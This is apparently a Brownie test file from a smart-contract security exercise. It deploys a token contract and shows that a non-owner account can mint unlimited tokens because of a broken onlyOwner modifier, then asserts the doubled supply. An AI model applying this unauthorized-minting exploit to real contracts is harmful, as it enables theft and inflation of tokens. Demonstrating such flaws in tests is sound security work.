from brownie import accounts, ToTheMoon

def test_access_control_2():

    [dep, user] = accounts[:2]
    
    #Deployed instance of the contract with totaSupply of 10000 tokens
    ac2 = ToTheMoon.deploy(10000, {'from': dep})

    assert(ac2.totalSupply() == 10000)
    assert(ac2.balanceOf(dep.address) == 10000)

    # Infinity Minting due to broken onlyOwner modifier
    ac2.mint(user.address, ac2.totalSupply(), {'from': user})

    # Asserting hack
    assert(ac2.balanceOf(user.address) == 10000)
    assert(ac2.totalSupply() == 20000)
